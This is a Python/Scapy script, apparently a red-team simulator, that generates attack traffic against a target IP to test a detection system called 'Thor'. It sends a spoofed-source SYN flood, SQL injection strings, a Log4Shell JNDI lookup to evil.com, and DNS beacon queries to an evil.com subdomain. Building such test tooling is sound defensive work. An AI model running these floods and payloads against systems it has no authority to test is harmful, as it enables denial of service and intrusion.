#!/usr/bin/env python3
"""
Thor Adversarial Simulator (TAS)
Generates real-world malicious traffic to test Thor's ERA detection and response.
Usage: sudo python3 tas.py --target 192.168.1.1 --attack ddos,rce,beacon
"""

import argparse
import random
import time
from scapy.all import *

def simulate_ddos(target_ip):
    print(f"🔥 Starting SYN Flood against {target_ip}...")
    for _ in range(1000):
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        send(IP(src=src_ip, dst=target_ip)/TCP(dport=80, flags="S"), verbose=0)

def simulate_rce_l7(target_ip):
    print(f"💀 Sending Log4Shell & SQLi primitives to {target_ip}...")
    payloads = [
        "GET /?q=1' UNION SELECT 1,2,3-- HTTP/1.1\r\nHost: target\r\n\r\n",
        "GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://evil.com/a}\r\nHost: target\r\n\r\n",
        "POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nadmin'--&pass=123"
    ]
    for p in payloads:
        send(IP(dst=target_ip)/TCP(dport=80)/Raw(load=p), verbose=0)

def simulate_beaconing(target_ip):
    print(f"📡 Simulating C2 Beaconing (Low & Slow) to {target_ip}...")
    for i in range(10):
        print(f"  > Sending heartbeat {i+1}/10")
        send(IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"beacon-{i}.internal.evil.com")), verbose=0)
        time.sleep(2) # 2-second interval

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Thor Adversarial Simulator")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--attack", default="ddos,rce", help="Attacks: ddos, rce, beacon")
    args = parser.parse_args()

    attacks = args.attack.split(",")
    if "ddos" in attacks: simulate_ddos(args.target)
    if "rce" in attacks: simulate_rce_l7(args.target)
    if "beacon" in attacks: simulate_beaconing(args.target)

    print("✅ Adversarial simulation complete.")
